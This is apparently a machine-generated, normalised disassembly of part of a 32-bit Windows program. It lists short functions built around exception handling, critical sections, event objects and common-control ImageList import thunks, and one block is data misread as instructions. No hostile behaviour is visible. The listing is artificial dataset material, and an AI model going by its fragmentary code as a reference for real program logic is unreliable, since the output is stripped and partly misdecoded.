sub_3a7dc0c
jmp sub_3a64b54
sub_3a7dc5e
jmp sub_3a64b54
sub_3a7dc7d
jmp sub_3a64b54
sub_3a7dc84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7dca3
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_3a7dc9c
jmp sub_3a64b54
sub_3a7dca3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7dd47
jmp sub_3a64b54
sub_3a7ddcf
jmp sub_3a64b54
sub_3a7dddc
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
pop ebx
retn
sub_3a7ddf4
mov eax [ rw-data ]
call sub_3a7dddc
retn
sub_3a7de2c
push ebx
call sub_3a7691c
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_3a7ddf4
sub_3a7dfaa
jmp sub_3a64b54
sub_3a7dfb1
mov eax [ ebp - 0x4 ]
add eax 0x80
call sub_3a652a0
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_3a7e160
jmp sub_3a64b54
sub_3a7e167
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3a7e285
jmp sub_3a64b54
sub_3a7e2a2
jmp sub_3a64b54
sub_3a7e2a9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7e3a8
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_3a7cb9c
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_3a7e46c
push ebx
mov ebx eax
mov eax ebx
call sub_3a7ff4c
cmp al 0x9
sete al
pop ebx
retn
sub_3a7e4d0
jmp sub_3a64b54
sub_3a7e4d7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_3a7e52c
jmp sub_3a64b54
sub_3a7e533
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_3a7e5dc
jmp sub_3a64b54
sub_3a7e5e3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a7e862
jmp sub_3a648a0
sub_3a7e88e
jmp sub_3a648a0
sub_3a7e930
jmp sub_3a648a0
sub_3a7e9d3
jmp sub_3a648a0
sub_3a7ebae
jmp sub_3a648a0
sub_3a7ebf0
jmp sub_3a64b54
sub_3a7ec20
jmp sub_3a64b54
sub_3a7ec27
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7ec97
jmp sub_3a64b54
sub_3a7ed6e
jmp sub_3a64b54
sub_3a7ed75
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7f07c
mov dl 0x1
call sub_3a7de80
retn
sub_3a7f1bd
jmp sub_3a64b54
sub_3a7f1c4
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7f1cc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_3a8005c
mov eax [ rw-data ]
call sub_3a7dddc
pop ebp
retn
j_sub_3a649cc
jmp sub_3a649cc
j_sub_3a649cc#2
jmp sub_3a649cc
sub_3a7f430
jmp sub_3a64b54
sub_3a7f437
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7f517
jmp sub_3a64b54
sub_3a7f51e
mov esp ebp
pop ebp
retn
sub_3a7f5d6
jmp sub_3a64b54
sub_3a7f5dd
pop ecx
pop ecx
pop ebp
retn
sub_3a7f8f0
jmp sub_3a64b54
sub_3a7f8f7
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7fb9e
jmp sub_3a64b54
sub_3a7fba5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_3a64380
retn
sub_3a7fbc1
jmp sub_3a64b54
sub_3a7fbe5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_3a648a0
sub_3a7fc1c
jmp sub_3a648a0
sub_3a7fc5b
jmp sub_3a64b54
sub_3a7fc62
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7fc84
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_3a652c4
retn
sub_3a7fc7d
jmp sub_3a64b54
sub_3a7fc84
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7fd0d
jmp sub_3a648a0
sub_3a7fd3a
jmp sub_3a64b54
sub_3a7fd41
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a7fd4c
push ecx
mov edx esp
mov ecx 0x4
call sub_3a7e3e4
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_3a7dddc
sub_3a7fe59
jmp sub_3a64b54
sub_3a7fe60
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a7ff3f
jmp sub_3a64b54
sub_3a7ff46
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7ff9c
jmp sub_3a64b54
sub_3a7ffa3
pop ebx
pop ecx
pop ebp
retn
sub_3a80201
jmp sub_3a64b54
sub_3a80208
pop ecx
pop ecx
pop ebp
retn
sub_3a80249
jmp sub_3a64b54
sub_3a80250
pop ebx
pop ecx
pop ebp
retn
sub_3a802ec
jmp sub_3a64b54
sub_3a802f3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a803a1
jmp sub_3a64b54
sub_3a803a8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a803b4
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_3a8060f
jmp sub_3a64b54
sub_3a80616
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8063b
mov eax [ ebp - 0x10 ]
call sub_3a64380
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
sub_3a80634
jmp sub_3a64b54
sub_3a8063b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a80660
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a80659
jmp sub_3a64b54
sub_3a80660
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8088a
jmp sub_3a64b54
sub_3a80891
pop ebx
mov esp ebp
pop ebp
retn
sub_3a808c4
mov eax [ eax + 0x30 ]
call sub_3a7a33c
retn
sub_3a80990
call sub_3a80ac0
retn
sub_3a809d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7d784
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_3a80aaf
jmp sub_3a64b54
sub_3a80ab6
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_3a80ac0
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_3a7ce00
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_3a80ad8
test dl dl
je r-xdata
mov dl 0x8
call sub_3a82d84
retn
mov dl 0x9
call sub_3a82d84
retn
sub_3a80b2f
jmp sub_3a64b54
sub_3a80b36
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a80b7f
jmp sub_3a64b54
sub_3a80b86
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a80c1e
jmp sub_3a64b54
sub_3a80c25
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a80dc3
jmp sub_3a64b54
sub_3a80dca
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a81111
jmp sub_3a64b54
sub_3a81153
jmp sub_3a64b54
sub_3a811b4
jmp sub_3a64b54
sub_3a811bb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a81420
mov dl 0x1
call sub_3a82d84
retn
sub_3a81428
xor edx edx
call sub_3a82d84
retn
sub_3a81527
jmp sub_3a64b54
sub_3a816fb
jmp sub_3a64b54
sub_3a81702
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a818d0
jmp sub_3a64b54
sub_3a818d7
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a819ad
jmp sub_3a64b54
sub_3a819b4
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_3a81ac7
jmp sub_3a64b54
sub_3a81ace
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_3a81b5f
jmp sub_3a64b54
sub_3a81b66
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_3a81d20
jmp sub_3a64b54
sub_3a81d27
pop ecx
pop ebp
retn
sub_3a81db2
jmp sub_3a64b54
sub_3a81db9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a81e20
jmp sub_3a64b54
sub_3a81e27
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a81ea5
jmp sub_3a64b54
sub_3a81eac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a81ec9
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a81ec2
jmp sub_3a64b54
sub_3a81ec9
pop ebx
pop ecx
pop ebp
retn
sub_3a81fba
jmp sub_3a64b54
sub_3a81fc1
pop ebx
pop ecx
pop ebp
retn
sub_3a82099
jmp sub_3a64b54
sub_3a820a0
pop ecx
pop ebp
retn
sub_3a820a4
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_3a821ab
jmp sub_3a64b54
sub_3a821b2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a82359
jmp sub_3a64b54
sub_3a823e0
jmp sub_3a64b54
sub_3a823e7
mov esp ebp
pop ebp
retn
sub_3a824b5
jmp sub_3a64b54
sub_3a824bc
pop ebx
mov esp ebp
pop ebp
retn
sub_3a82556
jmp sub_3a64b54
sub_3a8255d
pop ebx
mov esp ebp
pop ebp
retn
sub_3a825bd
jmp sub_3a64b54
sub_3a825c4
mov esp ebp
pop ebp
retn
sub_3a82a35
jmp sub_3a64b54
sub_3a82a8f
jmp sub_3a64b54
sub_3a82aa0
jmp sub_3a648a0
sub_3a82afc
jmp sub_3a64b54
sub_3a82b03
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a82b62
jmp sub_3a64b54
sub_3a82b69
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a82b70
mov edx rw-data
mov ecx 0x4
call sub_3a809ec
retn
sub_3a82cbd
jmp sub_3a64b54
sub_3a82cc4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a82d74
jmp sub_3a64b54
sub_3a82d7b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a82dbc
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_3a6ea2c
sub_3a82df0
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_3a82e08
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_3a82e14
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_3a82e08
sub_3a82e30
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_3a82e3c
push rw-data
call InterlockedIncrement
retn
sub_3a82e48
push rw-data
call InterlockedDecrement
retn
sub_3a82f5e
jmp sub_3a648a0
sub_3a82f9d
jmp sub_3a64b54
sub_3a82ffa
jmp sub_3a64b54
sub_3a83001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a83020
push rw-data
call LeaveCriticalSection
retn
sub_3a83019
jmp sub_3a64b54
sub_3a83020
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8306d
jmp sub_3a648a0
sub_3a8317e
jmp sub_3a64b54
sub_3a83185
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a83218
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_3a83590
sub_3a83292
jmp sub_3a64b54
sub_3a83299
pop ebx
mov esp ebp
pop ebp
retn
sub_3a832b8
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_3a832cc
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_3a832b8
call sub_3a83568
sub_3a833be
jmp sub_3a64b54
sub_3a833c5
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_3a834fc
jmp sub_3a64b54
sub_3a8351b
jmp sub_3a64b54
sub_3a83542
jmp sub_3a64b54
sub_3a8372c
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_3a83918
sub_3a8378c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_3a837a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7efcc
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_3a837b4
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_3a81354
retn
sub_3a837c0
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_3a81354
retn
sub_3a83a7c
xor eax eax
retn
sub_3a83a80
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_3a83a88
xor eax eax
retn
sub_3a83a8c
retn
sub_3a83a90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_3a652f4
pop esi
pop ebx
retn
sub_3a83aa4
mov eax [ eax + 0x4 ]
retn
sub_3a83aa8
retn
sub_3a83aac
xor eax eax
retn
sub_3a83ab0
retn
sub_3a83ab4
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_3a83ac0
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_3a83acc
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_3a83ad8
retn
sub_3a83adc
xchg edx eax
call sub_3a7ec3c
retn
sub_3a83ae4
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_3a83b6c
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_3a6457c
pop esi
retn
sub_3a83b80
retn
sub_3a83c64
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_3a652f4
pop esi
pop ebx
retn
sub_3a83ca4
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_3a83df0
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_3a645c8
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_3a83e90
retn
sub_3a83ed8
retn
sub_3a83f10
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_3a83f28
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_3a84154
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_3a6457c
pop esi
pop ebx
retn
sub_3a83f70
mov al 0x1
retn
sub_3a83f74
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_3a83f7c
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_3a8402c
xor eax eax
retn
sub_3a84030
retn
sub_3a8405c
retn
sub_3a840f4
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_3a84108
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_3a7a33c
retn
sub_3a84253
jmp sub_3a648a0
sub_3a84258
mov ebx 0x1
call sub_3a64cb0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_3a842bb
jmp sub_3a648a0
sub_3a842c0
mov ebx 0x80030103
call sub_3a64cb0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_3a8433e
jmp sub_3a648a0
sub_3a84343
mov ebx 0x80030009
call sub_3a64cb0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_3a843a1
jmp sub_3a648a0
sub_3a843a6
mov ebx 0x8000ffff
call sub_3a64cb0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_3a84577
jmp sub_3a64b54
sub_3a84588
jmp sub_3a648a0
sub_3a8458d
mov [ ebp - 0x4 ] 0x8000ffff
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a845b6
lea eax [ ebp + 0xc ]
call sub_3a66cb4
retn
sub_3a845af
jmp sub_3a64b54
sub_3a845b6
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_3a845c4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_3a845d0
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_3a845dc
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_3a845e8
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_3a84657
jmp sub_3a648a0
sub_3a8465c
mov esi 0x8000ffff
call sub_3a64cb0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_3a84670
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_3a846dd
jmp sub_3a64b54
sub_3a846e4
mov eax [ rw-data ]
call sub_3a64380
pop edi
pop esi
pop ebx
pop ebp
retn
sub_3a846f4
call sub_3a79a78
retn
sub_3a84960
jmp sub_3a64b54
sub_3a84967
pop ebp
retn
sub_3a84b08
call sub_3a7a33c
retn
sub_3a84b54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7a700
pop esi
pop ebx
retn
sub_3a84b68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7a494
pop esi
pop ebx
retn
sub_3a84b7c
call sub_3a7a4f0
retn
sub_3a84bb0
call sub_3a7a630
retn
sub_3a84ca8
call sub_3a84b08
retn
sub_3a84ce0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a84b54
pop esi
pop ebx
retn
sub_3a84cf4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a84b68
pop esi
pop ebx
retn
sub_3a84d08
mov edx ecx
call sub_3a84ce0
retn
sub_3a84d10
call sub_3a84b7c
retn
sub_3a84d80
call sub_3a84bb0
retn
sub_3a84e14
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_3a7a494
retn
sub_3a84e48
mov eax [ eax + 0x4 ]
call sub_3a7a33c
retn
sub_3a84fa5
add eax 0xffffffdc
jmp sub_3a85ff8
sub_3a84fad
add eax 0xffffffdc
jmp sub_3a8600c
sub_3a84fbf
add [ esp + 0x4 ] 0xffffffdc
jmp sub_3a66d88
sub_3a84fc9
add [ esp + 0x4 ] 0xffffffdc
jmp sub_3a66d9c
sub_3a84fd3
add eax 0xffffffd8
jmp sub_3a85eb4
sub_3a84fdb
add eax 0xffffffd8
jmp sub_3a856e0
sub_3a84fe3
add eax 0xffffffd8
jmp sub_3a85a1c
sub_3a84feb
add eax 0xffffffd8
jmp sub_3a85cc4
sub_3a85029
add eax 0xffffffd4
jmp sub_3a853b0
sub_3a8503b
add [ esp + 0x4 ] 0xffffffd4
jmp sub_3a66d88
sub_3a85224
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a852d4
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_3a66ccc
sub edx 0xffffffdc
sub_3a85450
jmp sub_3a64b54
sub_3a85457
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a855bd
jmp sub_3a64b54
sub_3a85608
jmp sub_3a64b54
sub_3a8560f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a856bc
jmp sub_3a64b54
sub_3a856c3
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3a8589a
jmp sub_3a64b54
sub_3a85935
jmp sub_3a64b54
sub_3a85952
jmp sub_3a64b54
sub_3a85977
jmp sub_3a64b54
sub_3a8597e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a859fc
jmp sub_3a64b54
sub_3a85a03
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a85c31
jmp sub_3a64b54
sub_3a85c95
jmp sub_3a64b54
sub_3a85c9c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a85cc4
call sub_3a854b0
retn
sub_3a85d8b
jmp sub_3a64b54
sub_3a85d92
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a85de4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
sub_3a85ded
jmp sub_3a64b54
j_sub_3a85de4
jmp sub_3a85de4
sub_3a85df4
pop ebx
pop ecx
pop ebp
retn
sub_3a85e99
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a85ea2
jmp sub_3a64b54
j_sub_3a85e99
jmp sub_3a85e99
sub_3a85ea9
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_3a85fa0
jmp sub_3a64b54
sub_3a85fd1
jmp sub_3a64b54
sub_3a85fd8
movzx eax [ ebp - 0x11 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a85fe1
add [ eax ] al
add [ ecx ] cl
pop [ ecx + 0x69 ]
dec ecx
pop esi
cdq
dec eax
sahf
adc ebx [ edi + 0x7549c1e3 ]
mov ax [ eax + 0x1c ]
retn
sub_3a85ff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x20 ]
call sub_3a652f4
pop esi
pop ebx
retn
sub_3a860ad
jmp sub_3a64b54
sub_3a860b4
pop ebp
retn
sub_3a86175
jmp sub_3a64b54
sub_3a8617c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a86790
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_3a8619c
mov [ rw-data ] sub_3a862b4
mov [ rw-data ] sub_3a86224
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_3a864b8
mov [ rw-data ] sub_3a8658c
mov [ rw-data ] sub_3a86660
retn
sub_3a86821
jmp sub_3a64b54
sub_3a86828
pop ebp
retn
InitCommonControls
jmp [ InitCommonControls@IAT ]
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_SetImageCount
jmp [ ImageList_SetImageCount@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_3a86970
movzx ecx cx
or ecx 0x0
push ecx
push edx
push 0x100c
push eax
call __imp_SendMessageA
retn
_TrackMouseEvent
jmp [ _TrackMouseEvent@IAT ]
sub_3a86de4
jmp sub_3a64b54
sub_3a86deb
pop ebp
retn
sub_3a86ee4
push ebx
mov ebx eax
test ebx ebx
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx ] 0x5c
jne r-xdata
xor eax eax
pop ebx
retn
sub_3a871d5
jmp sub_3a64b54
sub_3a871dc
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a873ac
jmp sub_3a64b54
sub_3a873b3
pop ebp
retn
sub_3a883e4
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_3a884cc
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_3a88540
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_3a8854c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_3a8862c
jmp sub_3a64b54
sub_3a88633
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a886c4
jmp sub_3a64b54
sub_3a88769
jmp sub_3a64b54
sub_3a88770
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a88778
retn
sub_3a887d8
jmp sub_3a64b54
sub_3a887df
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a887e8
cmp [ edx + 0x1d ] 0x0
je r-xdata
retn
lea eax [ edx + 0x18 ]
call sub_3a6efbc
sub_3a88858
jmp sub_3a64b54
sub_3a8885f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a88905
jmp sub_3a64b54
sub_3a8890c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a88d64
push 0x33
mov ecx rw-data
call sub_3a79db4
retn
sub_3a88d74
push 0x33
mov ecx rw-data
call sub_3a79d74
retn
sub_3a88d84
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_3a88da8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_3a88f7c
push 0x11
mov ecx rw-data
call sub_3a79d74
retn
sub_3a890c8
push ebx
mov ebx eax
mov eax ebx
call sub_3a88d84
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_3a89182
jmp sub_3a64b54
sub_3a89189
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a88da8
retn
sub_3a8919f
jmp sub_3a64b54
sub_3a891b8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xc
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_3a89215
jmp sub_3a64b54
sub_3a8921c
pop ebx
pop ecx
pop ebp
retn
sub_3a89454
jmp sub_3a64b54
sub_3a8947c
jmp sub_3a64b54
sub_3a89483
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a894f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1f
call sub_3a65504
pop esi
pop ebx
retn
sub_3a8956c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_3a894c0
push eax
call MulDiv
neg eax
pop ebx
retn
sub_3a895a8
mov eax [ eax + 0x10 ]
movzx edx [ eax + 0x1d ]
mov eax edx
retn
sub_3a895ec
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_3a89624
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1e ]
retn
sub_3a8965c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_3a89783
jmp sub_3a64b54
sub_3a8978a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a88da8
retn
